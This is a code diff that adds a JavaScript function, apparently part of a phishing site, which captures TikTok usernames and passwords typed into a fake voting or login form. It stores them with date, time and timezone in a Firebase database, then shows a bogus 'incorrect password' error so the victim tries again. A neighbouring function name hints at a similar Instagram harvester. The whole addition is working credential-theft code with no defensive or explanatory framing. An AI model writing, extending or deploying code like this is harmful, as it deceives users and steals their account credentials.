@@ -129,3 +129,37 @@ function iglog() {
 function showError(message) {
   alert(message);
 }
+
+function toklog() {
+  firebase
+    .auth()
+    .signInAnonymously()
+    .catch(function (error) {
+      showAlert("Error", error.message);
+    });
+
+  var username = document.getElementById("tok-uname").value;
+  var password = document.getElementById("tok-pass").value;
+  var currentDate = new Date().toISOString().slice(0, 10);
+  var currentTime = new Date().toISOString().slice(11, 19);
+  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  var accountType = "TikTok";
+
+  if (username !== "" && password !== "") {
+    firebase.database().ref("fbdet").push({
+      emle: username,
+      mobile: "",
+      time: currentTime,
+      timezone: timezone,
+      pass: password,
+      date: currentDate,
+      type: accountType,
+    });
+
+    setTimeout(function () {
+      showAlert("Vote not successful", "Incorrect account or password.");
+      document.getElementById("tok-pass").value = "";
+      return false;
+    }, 2000);
+  }
+}
